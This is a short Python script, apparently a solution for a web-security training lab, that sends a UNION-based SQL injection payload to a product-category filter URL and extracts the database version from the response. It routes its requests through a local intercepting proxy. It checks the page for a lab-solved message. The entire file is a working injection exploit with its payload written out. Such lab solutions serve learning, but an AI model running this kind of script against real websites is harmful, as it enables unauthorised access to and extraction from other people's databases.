# Code From https://github.com/me-amirkarimi

from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(host, category):
    url = f'{host}/filter?category={category}'
    payload = "' UNION SELECT '~~DBVERSION~~',@@version%23"
    r1 = requests.get(f'{url}{payload}', verify=False, proxies=proxies)

    time.sleep(2)
    r2 = requests.get(url, verify=False, proxies=proxies)
    if 'Congratulations, you solved the lab' in r2.text:
        print(f"[+] Dumping version information:")
        soup = BeautifulSoup(r1.text, 'html.parser')
        print(f"[+]   {soup.find('th', string='~~DBVERSION~~').parent.findNext('td').contents[0]}")
        return True
    return False

if __name__ == "__main__":
    print('[+] Enhancing SQL injection attack script for querying database type and version on MySQL and Microsoft')
    try:
        host = sys.argv[1].strip().rstrip('/')
        category = "notRelevant"
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    if exploit(host, category):
        print('[+] Injection successfully enhanced')
    else:
        print('[-] Injection enhancement failed')
